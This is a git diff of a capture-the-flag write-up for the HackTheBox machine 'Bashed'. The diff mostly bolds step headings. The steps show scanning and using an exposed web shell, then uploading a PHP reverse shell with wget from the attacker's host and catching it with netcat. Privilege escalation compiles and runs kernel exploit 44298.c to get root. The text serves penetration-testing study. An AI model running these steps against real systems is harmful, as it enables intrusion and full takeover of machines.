@@ -1,6 +1,7 @@
+
 ## Discover & Exploit : 
 
-1. root@kali:/tmp# nmap -A -sV -sC -p- 10.10.10.68
+**1. root@kali:/tmp# nmap -A -sV -sC -p- 10.10.10.68**
 ```
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-23 09:11 EDT
 Nmap scan report for 10.10.10.68
@@ -30,7 +31,7 @@ HOP RTT      ADDRESS
 1   27.05 ms 10.10.14.1
 2   27.76 ms 10.10.10.68
 ```
-2. root@kali:~# dirb http://10.10.10.68
+**2. root@kali:~# dirb http://10.10.10.68**
 ```
 -----------------
 DIRB v2.22    
@@ -95,7 +96,7 @@ DOWNLOADED: 9224 - FOUND: 3
 
 >Configure Proxy in browser to use 10.10.10.68
 	
-3. root@kali:~# nikto -h 127.0.1.1 -useproxy http://10.10.10.68
+**3. root@kali:~# nikto -h 127.0.1.1 -useproxy http://10.10.10.68**
 ```
 	- Nikto v2.1.6
 	---------------------------------------------------------------------------
@@ -122,15 +123,15 @@ DOWNLOADED: 9224 - FOUND: 3
 	+ 1 host(s) tested
 ```	
 	
-4. Browse to http://127.0.1.1/dev/phpbash.php , we get the shell in the browser
+**4. Browse to http://127.0.1.1/dev/phpbash.php , we get the shell in the browser**
 
-5. root@kali:/tmp# cp /usr/share/webshells/php/php-reverse-shell.php .
+**5. root@kali:/tmp# cp /usr/share/webshells/php/php-reverse-shell.php .**
 
 >Edit to include attacker IP and port in php-reverse-shell.php
 
-6. root@kali:/tmp# python -m SimpleHTTPServer 8000
+**6. root@kali:/tmp# python -m SimpleHTTPServer 8000**
 	
-7. From the browser we upload the webshell
+**7. From the browser we upload the webshell**
 ```
 www-data@bashed :/var/www/html/uploads# wget http://10.10.14.37:8000/php-reverse-shell.php
 	
@@ -145,7 +146,7 @@ Saving to: 'php-reverse-shell.php'
 2020-08-21 19:37:46 (28.2 MB/s) - 'php-reverse-shell.php' saved [5493/5493]
 ```	
 
-8. Start from attacker Machine nc -nvlp 4444 and browse http://127.0.1.1/uploads/php-reverse-shell.php
+**8. Start from attacker Machine nc -nvlp 4444 and browse http://127.0.1.1/uploads/php-reverse-shell.php**
 	
    root@kali:~# nc -nvlp 4444
 ```
@@ -160,7 +161,7 @@ $ python -c 'import pty; pty.spawn("/bin/bash")'
 www-data@bashed:/$
 ```	
 	
-9. www-data@bashed:/home/arrexel$ ls -la
+**9. www-data@bashed:/home/arrexel$ ls -la**
 ```
 ls -la
 total 36
@@ -176,7 +177,7 @@ drwxrwxr-x 2 arrexel arrexel 4096 Dec  4  2017 .nano
 -r--r--r-- 1 arrexel arrexel   33 Dec  4  2017 user.txt
 ```
 
-10. www-data@bashed:/home/arrexel# cat user.txt
+**10. www-data@bashed:/home/arrexel# cat user.txt**
 
     2c281f318555dbc1b856957c7147bfc1
          
@@ -185,12 +186,12 @@ drwxrwxr-x 2 arrexel arrexel 4096 Dec  4  2017 .nano
 ## Privilege escalation :
 
 
-1. www-data@bashed:/scripts$ uname -a
+**1. www-data@bashed:/scripts$ uname -a**
 ```
 uname -a
 Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 ```	
-2.  root@kali:/tmp# searchsploit linux kernel 4.4. privilege Escalation
+**2.  root@kali:/tmp# searchsploit linux kernel 4.4. privilege Escalation**
 ```
 ----------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
  Exploit Title                                                                                                                                             |  Path
@@ -212,13 +213,13 @@ Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - 
 
 >Tried few exploit from this list , noticed exploit 44298.c to be working
 
-3. root@kali:/tmp# cp /usr/share/exploitdb/exploits/linux/local/44298.c .
+**3. root@kali:/tmp# cp /usr/share/exploitdb/exploits/linux/local/44298.c .**
    
    root@kali:/tmp# gcc 44298.c -o pww
 	
-4. www-data@bashed:/scripts$ wget http://10.10.14.37:8000/pww
+**4. www-data@bashed:/scripts$ wget http://10.10.14.37:8000/pww**
 ```
-http://10.10.14.37:8000/pww
+--2020-08-22 05:27:15--  http://10.10.14.37:8000/pww
 Connecting to 10.10.14.37:8000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 17888 (17K) [application/octet-stream]
@@ -228,9 +229,9 @@ pww                 100%[===================>]  17.47K  --.-KB/s    in 0.03s
 
 2020-08-22 05:27:15 (540 KB/s) - 'pww' saved [17888/17888]
 ```
-5. www-data@bashed:/scripts$ chmod 777 pww
+**5. www-data@bashed:/scripts$ chmod 777 pww**
 
-6. www-data@bashed:/scripts$ ./pww
+**6. www-data@bashed:/scripts$ ./pww**
 ```
 ./pww
 task_struct = ffff880035124600
@@ -239,6 +240,6 @@ spawning root shell
 root@bashed:/scripts#
 ```
 
-7. root@bashed:/root# cat root.txt
+**7. root@bashed:/root# cat root.txt**
 
    cc4f0afe3a1026d402ba10329674a8e2
